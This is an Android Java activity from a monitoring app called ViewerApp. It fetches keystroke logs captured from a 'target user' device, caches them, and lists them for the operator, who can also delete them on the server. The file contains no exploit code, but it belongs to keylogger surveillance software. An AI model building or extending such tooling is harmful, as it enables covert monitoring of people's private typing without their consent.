/*
  ClassName: KeyloggerHistory.java
  AppName: ViewerApp
  Created by Lucas Walker (lucas.walker@jexpa.com)
  Created Date: 2021-07-23
  Description: The KeyloggerHistory class is used to display the history viewed by the target user on the keylogger
  and call it from the server displayed on the RecyclerView of the class.
  History: 2021-07-19
  Copyright © 2018 Jexpa LLC. All rights reserved.
 */

package com.scp.viewer.View;

import android.annotation.SuppressLint;
import android.graphics.drawable.ColorDrawable;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;
import com.google.gson.Gson;
import com.r0adkll.slidr.Slidr;
import com.scp.viewer.API.APIDatabase;
import com.scp.viewer.API.APIMethod;
import com.scp.viewer.Adapter.AdapterKeyloggerHistory;
import com.scp.viewer.Database.DatabaseKeylogger;
import com.scp.viewer.Database.DatabaseLastUpdate;
import com.scp.viewer.Model.Keyloggers;
import com.scp.viewer.Model.Table;
import com.scp.viewer.R;
import com.wang.avi.AVLoadingIndicatorView;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import static com.scp.viewer.API.APIMethod.GetJsonFeature;
import static com.scp.viewer.API.APIMethod.PostJsonClearDataToServer;
import static com.scp.viewer.API.APIMethod.alertDialogDeleteItems;
import static com.scp.viewer.API.APIMethod.getSharedPreferLong;
import static com.scp.viewer.API.APIMethod.setSharedPreferLong;
import static com.scp.viewer.API.APIMethod.setToTalLog;
import static com.scp.viewer.API.APIMethod.startAnim;
import static com.scp.viewer.API.APIMethod.stopAnim;
import static com.scp.viewer.API.APIURL.bodyLogin;
import static com.scp.viewer.API.APIURL.deviceObject;
import static com.scp.viewer.API.APIURL.getTimeNow;
import static com.scp.viewer.API.APIURL.isConnected;
import static com.scp.viewer.API.APIURL.noInternet;
import static com.scp.viewer.API.Global.CONTACT_PULL_ROW;
import static com.scp.viewer.API.Global.GET_KEYLOGGER_HISTORY;
import static com.scp.viewer.API.Global.KEYLOGGER_PULL_ROW;
import static com.scp.viewer.API.Global.KEYLOGGER_TOTAL;
import static com.scp.viewer.API.Global.LIMIT_REFRESH;
import static com.scp.viewer.API.Global.NEW_ROW;
import static com.scp.viewer.API.Global.NumberLoad;
import static com.scp.viewer.API.Global.POST_CLEAR_MULTI_KEYLOGGER;
import static com.scp.viewer.API.Global.TABLE;
import static com.scp.viewer.API.Global.TABLE1;
import static com.scp.viewer.API.Global._TOTAL;
import static com.scp.viewer.API.Global.time_Refresh_Device;
import static com.scp.viewer.Database.Entity.KeyloggerEntity.TABLE_KEYLOGGER_HISTORY;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_KEYLOGGER;
import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.TABLE_LAST_UPDATE;

public class KeyloggerHistory extends AppCompatActivity {
    private Toolbar toolbar;
    private RecyclerView mRecyclerView;
    private RecyclerView.Adapter mAdapter;
    List<Keyloggers> mData = new ArrayList<>();
    List<Keyloggers> keyloggersListAdd = new ArrayList<>();
    // action mode
    public static boolean isInActionMode;
    public static ArrayList<Keyloggers> selectionList;
    private DatabaseKeylogger database_Keylogger;
    private SwipeRefreshLayout swp_Keylogger_History;
    private DatabaseLastUpdate database_last_update;
    private Table table;
    private LinearLayout lnl_Total;
    private TextView txt_No_Data_Keylogger, txt_Total_Data;
    private ProgressBar progressBar_Keylogger;
    private boolean checkLoadMore = false;
    private boolean checkRefresh = false;
    boolean isLoading = false;
    private int currentSize = 0;
    boolean endLoading = false;
    // This is the value to store the temporary variable when you choose to select all item or remove all selected items.
    boolean selectAll = false;
    private AVLoadingIndicatorView avLoadingIndicatorView;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_keylogger_history);
        Slidr.attach(this);
        setID();
        selectionList = new ArrayList<>();
        isInActionMode = false;
        database_Keylogger = new DatabaseKeylogger(this);
        database_last_update = new DatabaseLastUpdate(this);
        table = (Table) getIntent().getSerializableExtra(TABLE_KEYLOGGER_HISTORY);
        // show dialog Loading...
        getKeyloggerInfo();
        swipeRefreshLayout();
    }

    private void setID() {
        toolbar = findViewById(R.id.toolbar_Keylogger_History);
        toolbar.setTitle(MyApplication.getResourcses().getString(R.string.KEYLOGGER_HISTORY));
        toolbar.setBackgroundResource(R.drawable.custom_bg_shopp);
        setSupportActionBar(toolbar);
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
        }
        lnl_Total = findViewById(R.id.lnl_Total);
        lnl_Total.setVisibility(View.INVISIBLE);
        txt_Total_Data = findViewById(R.id.txt_Total_Data);
        txt_No_Data_Keylogger = findViewById(R.id.txt_No_Data_Keylogger);
        progressBar_Keylogger = findViewById(R.id.progressBar_Keylogger);
        progressBar_Keylogger.setVisibility(View.GONE);
        swp_Keylogger_History = findViewById(R.id.swp_Keylogger_History);
        avLoadingIndicatorView = findViewById(R.id.aviKeylogger);
        // recyclerView
        mRecyclerView = findViewById(R.id.rcl_Keylogger_History);
        mRecyclerView.setHasFixedSize(true);
        RecyclerView.LayoutManager mLayoutManager = new LinearLayoutManager(this);
        mRecyclerView.setLayoutManager(mLayoutManager);
    }

    /**
     * This is a method to get data from the server to the device and display it in Recyclerview.
     * If there is no internet, get data from SQLite stored on the device and display it in Recyclerview.
     */
    @SuppressLint("SetTextI18n")
    private void getKeyloggerInfo() {
        //if there is a network call method
        if (isConnected(this)) {
            avLoadingIndicatorView.setVisibility(View.VISIBLE);
            startAnim(avLoadingIndicatorView);
            new getKeyloggerAsyncTask(0).execute();
        } else {
            lnl_Total.setVisibility(View.VISIBLE);
            Toast.makeText(this, R.string.TurnOn, Toast.LENGTH_SHORT).show();
            //int i= databaseDevice.getDeviceCount();
            int i = database_Keylogger.get_Keylogger_Count_DeviceID(table.getID());
            if (i == 0) {
                txt_No_Data_Keylogger.setVisibility(View.VISIBLE);
                txt_No_Data_Keylogger.setText(MyApplication.getResourcses().getString(R.string.NoData));
                txt_Total_Data.setText("0");
            } else {
                mData.clear();
                mData = database_Keylogger.getAll_Keylogger_ID_History(table.getID(),0);
                mAdapter = new AdapterKeyloggerHistory(this, (ArrayList<Keyloggers>) mData);
                if(mData.size() >= NumberLoad)
                {
                    initScrollListener();
                }
                mRecyclerView.setAdapter(mAdapter);
                mAdapter.notifyDataSetChanged();
                txt_No_Data_Keylogger.setText(MyApplication.getResourcses().getString(R.string.TurnOn));
                txt_Total_Data.setText(getSharedPreferLong(getApplicationContext(), KEYLOGGER_TOTAL + table.getDevice_Identifier())+"");
            }
        }
    }

    /**
     * swipeRefreshLayout is a method that reloads the page and updates it further if new data has been added to the server.
     */
    public void swipeRefreshLayout() {
        swp_Keylogger_History.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                Calendar calendar = Calendar.getInstance();
                endLoading = false;
                checkLoadMore = false;
                currentSize = 0;
                if (isConnected(getApplicationContext()))
                {
                    checkRefresh = true;
                    if ((calendar.getTimeInMillis() - time_Refresh_Device) > LIMIT_REFRESH) {
                        //mData.clear();
                        if (!mData.isEmpty())
                        {
                            mData.clear(); //The list for update recycle view
                            mAdapter.notifyDataSetChanged();
                        }
                        clearActionMode();
                        new getKeyloggerAsyncTask(0).execute();
                        new Handler().postDelayed(new Runnable() {
                            @Override
                            public void run()
                            {
                                swp_Keylogger_History.setRefreshing(false);
                                Calendar calendar1 = Calendar.getInstance();
                                time_Refresh_Device = calendar1.getTimeInMillis();
                            }
                        }, 1000);
                    } else {
                        swp_Keylogger_History.setRefreshing(false);
                    }
                } else {
                    swp_Keylogger_History.setRefreshing(false);
                    noInternet(KeyloggerHistory.this);
                }
            }
        });
    }

    /**
     * This is a feature load more for user view data in the type as page as on web each time only see 30 items after that when the last scod down, new load data after.
     */
    private void initScrollListener() {
        mRecyclerView.addOnScrollListener(new RecyclerView.OnScrollListener() {
            @Override
            public void onScrollStateChanged(@NonNull RecyclerView recyclerView, int newState) {
                super.onScrollStateChanged(recyclerView, newState);
            }

            @Override
            public void onScrolled(@NonNull RecyclerView recyclerView, int dx, int dy) {
                super.onScrolled(recyclerView, dx, dy);

                LinearLayoutManager linearLayoutManager = (LinearLayoutManager) recyclerView.getLayoutManager();
                // && !endLoading
                if (!isLoading && (!endLoading))
                {
                    if (linearLayoutManager != null && linearLayoutManager.findLastCompletelyVisibleItemPosition() == mData.size() - 1)
                    {
                        //bottom of list!
                        isLoading = true;
                        progressBar_Keylogger.setVisibility(View.VISIBLE);
                        //loadMore();

                        if(!checkRefresh)
                        {
                            loadMore();
                        }
                        else {
                            isLoading = false;
                            endLoading = false;
                            progressBar_Keylogger.setVisibility(View.GONE);
                            checkRefresh = false;
                        }
                    }
                }
            }
        });
    }

    /**
     * loadMore this is the parship support each page are display the 30 items
     * and after that when user load down the same same will going to load more 30 items to when the all.
     */
    private void loadMore() {
        try {
            checkLoadMore = true;
            Handler handler = new Handler();
            handler.postDelayed(new Runnable() {
                @Override
                public void run()
                {
                    currentSize =  mData.size();
                    if(isConnected(getApplicationContext()))
                    {
                        // Here is the total item value contact of device current has on CPanel
                        long totalContact = getSharedPreferLong(getApplicationContext(), KEYLOGGER_TOTAL + table.getDevice_Identifier());
                        new getKeyloggerAsyncTask(currentSize+1).execute();

                        if((mData.size()+1) >= totalContact)
                        {
                            endLoading = true;
                        }
                        isLoading = false;

                    }
                    else {
                        List<Keyloggers> mDataKeyloggers = database_Keylogger.getAll_Keylogger_ID_History(table.getID(),currentSize);
                        // Here is the total item value contact of device current has on Cpanel
                        int insertIndex = mData.size();
                        mData.addAll(insertIndex,mDataKeyloggers);
                        mAdapter.notifyItemRangeInserted(insertIndex-1,mDataKeyloggers.size() );
                        if(mDataKeyloggers.size()< NumberLoad)
                        {
                            endLoading = true;
                        }
                        isLoading = false;
                        progressBar_Keylogger.setVisibility(View.GONE);
                    }
                }
            }, 100);

        }catch (Exception e)
        {
            e.getMessage();
        }
    }

    // location get method from sever
    @SuppressLint("StaticFieldLeak")
    private class getKeyloggerAsyncTask extends AsyncTask<String, Void, String>
    {
        long startIndex;

        public getKeyloggerAsyncTask(long startIndex) {
            this.startIndex = startIndex;
        }
        @Override
        protected String doInBackground(String... strings) {

            Log.d("Keylogger_Id", table.getDevice_Identifier() + "");

            return GetJsonFeature(table, this.startIndex, GET_KEYLOGGER_HISTORY);
        }

        @SuppressLint("SetTextI18n")
        @Override
        protected void onPostExecute(String s) {
            try {
                deviceObject(s);
                JSONObject jsonObj = new JSONObject(bodyLogin.getData());
                JSONArray NotificationJson = jsonObj.getJSONArray(TABLE);
                JSONArray NotificationJsonTable1 = jsonObj.getJSONArray(TABLE1);
                setToTalLog(NotificationJsonTable1, KEYLOGGER_TOTAL + table.getDevice_Identifier(), getApplicationContext());
                setSharedPreferLong(getApplicationContext(), KEYLOGGER_PULL_ROW +_TOTAL+ table.getDevice_Identifier() + NEW_ROW, 0);

                if (NotificationJson.length() != 0) {

                    for (int i = 0; i < NotificationJson.length(); i++) {

                        Gson gson = new Gson();
                        Keyloggers keyloggers = gson.fromJson(String.valueOf(NotificationJson.get(i)), Keyloggers.class);
                        keyloggersListAdd.add(keyloggers);
                        Log.d("KeyloggerHistory"," Add Keylogger = "+  keyloggers.getContent());

                    }
                    if (keyloggersListAdd.size() != 0) {
                        database_Keylogger.addKeylogger(keyloggersListAdd);
                    }
                }
                //mData.clear();
                Log.d("KeyloggerHistory"," currentSize Keylogger = "+  currentSize+ " checkLoadMore = "+ checkLoadMore);
                List<Keyloggers> mDataTamp = database_Keylogger.getAll_Keylogger_ID_History(table.getID(),currentSize);
                //mData.addAll(mDataTamp);

                if(checkLoadMore)
                {
                    int insertIndex = mData.size();
                    // mData.addAll(insertIndex, mDataTamp);
                    mData.addAll(insertIndex, mDataTamp);
                    Log.d("checkdata"," MData Keylogger = "+ mDataTamp.size());
                    mAdapter.notifyItemRangeInserted(insertIndex-1,mDataTamp.size() );
                    progressBar_Keylogger.setVisibility(View.GONE);
                }
                else {

                    mData.clear();
                    mData.addAll(mDataTamp);
                    if(mData.size() >= NumberLoad)
                    {
                        initScrollListener();
                    }
                    mAdapter = new AdapterKeyloggerHistory(KeyloggerHistory.this, (ArrayList<Keyloggers>) mData);
                    mRecyclerView.setAdapter(mAdapter);
                    mAdapter.notifyDataSetChanged();
                }
                lnl_Total.setVisibility(View.VISIBLE);
                if (mData.size() == 0) {
                    txt_No_Data_Keylogger.setVisibility(View.VISIBLE);
                    txt_No_Data_Keylogger.setText(MyApplication.getResourcses().getString(R.string.NoData));
                    txt_Total_Data.setText("0");
                }else {
                    String max_Date = getTimeNow();
                    database_last_update.update_Last_Time_Get_Update(TABLE_LAST_UPDATE, COLUMN_LAST_KEYLOGGER, max_Date, table.getDevice_Identifier());
                    String min_Time1 = database_last_update.getLast_Time_Update(COLUMN_LAST_KEYLOGGER, TABLE_LAST_UPDATE, table.getDevice_Identifier());
                    Log.d("min_time1", min_Time1 + "");
                    txt_No_Data_Keylogger.setText(("Last update: "+ APIDatabase.getTimeItem(database_last_update.getLast_Time_Update(COLUMN_LAST_KEYLOGGER, TABLE_LAST_UPDATE, table.getDevice_Identifier()),null)));
                    txt_Total_Data.setText(getSharedPreferLong(getApplicationContext(), KEYLOGGER_TOTAL + table.getDevice_Identifier())+"");
                }
                stopAnim(avLoadingIndicatorView);
            } catch (JSONException e) {
                //MyApplication.getInstance().trackException(e);
                e.printStackTrace();
            }
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);
        getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));
        return true;
    }

    public void prepareToolbar(int position) {
        // prepare action mode
        toolbar.getMenu().clear();
        //toolbar.inflateMenu(R.menu.menu_action_mode);
        toolbar.inflateMenu(R.menu.menu_action_delete);
        isInActionMode = true;
        mAdapter.notifyDataSetChanged();
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
            getSupportActionBar().setHomeAsUpIndicator(R.drawable.ic_clear_black_24dp);
        }
        prepareSelection(position);
    }

    // Lightning current event selection has been deleted, there is no added, then
    public void prepareSelection(int position) {

        if (!selectionList.contains(mData.get(position))) {
            selectionList.add(mData.get(position));
        } else {
            selectionList.remove(mData.get(position));
        }

        updateViewCounter();
    }

    private void updateViewCounter() {
        int counter = selectionList.size();
        if (counter == 0) {
            toolbar.setTitle("  " + counter + " item selected");
        } else {
            toolbar.setTitle("  " + counter + " item selected");
        }
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {

        if (item.getItemId() == R.id.item_delete) {
            if (isConnected(KeyloggerHistory.this)) {

                alertDialogDeleteItems(KeyloggerHistory.this,
                        getApplicationContext().getResources().getString(R.string.question_Select),
                        new clear_App());
            } else {
                Toast.makeText(this, getResources().getString(R.string.TurnOn), Toast.LENGTH_SHORT).show();
                clearActionMode();
                mAdapter.notifyDataSetChanged();
            }
        }
        else if(item.getItemId() ==  R.id.item_select_all)
        {
            if(!selectAll)
            {
                selectAll = true;
                selectionList.clear();
                selectionList.addAll(mData);
                updateViewCounter();
                mAdapter.notifyDataSetChanged();
            }
            else {
                selectAll = false;
                selectionList.clear();
                updateViewCounter();
                mAdapter.notifyDataSetChanged();
            }
        }
        else if (item.getItemId() == android.R.id.home) {
            if(isInActionMode)
            {
                clearActionMode();
                mAdapter.notifyDataSetChanged();
            }
            else {
                super.onBackPressed();
            }
        }
        return true;
    }

    // Method clear data to sever
    @SuppressLint("StaticFieldLeak")
    private class clear_App extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... strings) {
            Log.d("App_Id", table.getDevice_Identifier() + "");
            StringBuilder listID = new StringBuilder();
            //Toast.makeText(HistoryLocation.this, selectionList.get(0).getID()+"", Toast.LENGTH_SHORT).show();
            for (int i = 0; i < selectionList.size(); i++) {
                if (i != selectionList.size() - 1) {
                    listID.append(selectionList.get(i).getID()).append(",");
                } else {

                    listID.append(selectionList.get(i).getID());
                }
            }
            Log.i("listID", listID.toString());
           /* String value = "<RequestParams Device_ID=\"" + table.getDevice_Identifier() + "\" List_ID=\"" + listID + "\" />";
            String function = POST_CLEAR_MULTI_APP;*/
            return PostJsonClearDataToServer(table.getDevice_Identifier(), listID, POST_CLEAR_MULTI_KEYLOGGER);
        }

        @Override
        protected void onPostExecute(String s) {

            deviceObject(s);

            if (bodyLogin.getResultId().equals("1") && bodyLogin.getIsSuccess().equals("1")) {
                ((AdapterKeyloggerHistory) mAdapter).removeData(selectionList);
                clearDataSQLite(selectionList);
                clearActionMode();
            } else {
                clearActionMode();
                Toast.makeText(KeyloggerHistory.this, bodyLogin.getDescription(), Toast.LENGTH_SHORT).show();
            }
            // get Method getThread()
            APIMethod.progressDialog.dismiss();
        }
    }

    // delete on SQLite
    public void clearDataSQLite(ArrayList<Keyloggers> selectionList) {
        for (Keyloggers notifications : selectionList) {
            database_Keylogger.delete_Keylogger_History(notifications);
        }
    }

    // back toolbar home, clear List selectionList
    public void clearActionMode() {
        isInActionMode = false;
        toolbar.getMenu().clear();
        toolbar.inflateMenu(R.menu.menu_main);
        if (getSupportActionBar() != null) {
            getSupportActionBar().setDisplayHomeAsUpEnabled(true);
            getSupportActionBar().setHomeAsUpIndicator(null);
        }
        toolbar.setTitle( MyApplication.getResourcses().getString(R.string.KEYLOGGER_HISTORY));
        selectionList.clear();
    }

    // Check out the escape without the option will always exit,
    // the opposite will cancel the selection, not exit.
    @Override
    public void onBackPressed() {
        if (isInActionMode) {
            clearActionMode();
            isInActionMode = false;
            mAdapter.notifyDataSetChanged();
        } else {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (APIMethod.progressDialog != null && APIMethod.progressDialog.isShowing()) {
            APIMethod.progressDialog.dismiss();
        }
    }
}
